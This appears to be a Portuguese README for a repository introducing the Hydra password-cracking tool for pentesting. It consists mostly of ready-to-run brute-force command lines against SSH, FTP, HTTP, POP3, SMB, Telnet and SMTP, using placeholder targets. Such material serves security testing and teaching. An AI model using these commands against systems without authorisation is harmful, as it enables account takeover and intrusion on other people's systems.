# Hydra
Nesse repositório abordarei mais a respeito do Hydra, que é um software conhecido em segurança da informação e pentest. Não é exatamente uma ferramenta "hacker", mas sim uma ferramenta que pode ser usada por profissionais para testar a segurança de sistemas e redes e analisar suas vulnerabilidades.

Se você se conhece, mas não conhece o inimigo, para cada vitória ganha. sofrerá também uma derrota. - antigo proverbio chinês.

Nos comandos o “username” é o nome do usuário que você deseja atacar e “password_list.txt” é o nome do arquivo de lista de senhas que você deseja usar para o ataque. O “target_ip” é o endereço IP do servidor que você deseja atacar.


Força bruta em SSH:

hydra -l username -P password_list.txt ssh://target_ip 

Força bruta em FTP:

hydra -l username -P password_list.txt ftp://target_ip  

Força bruta em HTTP:

hydra -L user_list.txt -P password_list.txt http://target_ip

Força Bruta em POP 3:

hydra -l username -P password_list.txt pop3://target_ip

Força Bruta em SMB:

hydra -l username -P password_list.txt smb://target_ip

Força Bruta em Telnet: 

hydra -l username -P password_list.txt telnet://target_ip

Força Bruta em SMTP:

hydra -l username -P password_list.txt smtp://target_ip
